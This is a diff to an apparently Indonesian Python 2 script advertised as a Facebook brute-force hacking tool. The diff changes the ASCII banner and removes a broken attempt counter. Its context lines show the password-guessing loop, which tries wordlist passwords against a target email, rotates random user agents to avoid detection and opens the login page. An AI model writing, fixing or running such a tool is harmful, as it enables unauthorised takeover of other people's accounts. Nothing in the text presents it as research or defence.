@@ -37,12 +37,14 @@ def banner():
     os.system('clear')
     print " "
     runntxt(GL+"              Assalamu'@laikum. ^_^")
-    runntxt(WW+"     ___      _           _         _      __")
-    runntxt(WW+"    |_ _|__ _| |__   __ _| |____   | |__  / _|")
-    runntxt(GL+"     | |/ _` | '_ \ / _` | |_  /   | '_ \| |_")
-    runntxt(GG+"     | | (_| | |_) | (_| | |/ /_   | |_) |  _|")
-    runntxt(Y+"    |___\__, |_.__/ \__,_|_/___/___|_.__/|_|")
-    runntxt(GG+"           |_| ")
+    runntxt(WW+'''   __________                __          
+	             \______   \_______ __ ___/  |_  ____  
+ 	              |    |  _/\_  __ \  |  \   __\/ __ \ 
+ 		      |    |   \ |  | \/  |  /|  | \  ___/ 
+ 		      |______  / |__|  |____/ |__|  \___  >
+                     	     \/                         \/ ''')
+			   
+	    
     time.sleep(1.5)
     print GG+"  √=============================================√"
     print GL+"  |••••••   NEW TOOLS HACK FACEBOOK BF.   ••••••|"
@@ -113,11 +115,10 @@ def main():
         print RR+" wordlist tidak ada yg cocok..."
         print " "
 	
-count = 0
+
 def iqbalz(iqbalz_password):
   try:
- 	sys.stdout.write(GG+"\n[\033[91m"+count+"\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
-	count += 1
+ 	sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[90m Mencoba ==> \033[91m[\033[90;1m"+iqbalz_password)
 	sys.stdout.flush()
 	noobs.addheaders = [('User-agent', random.choice(useragents))]
 	site = noobs.open(login)
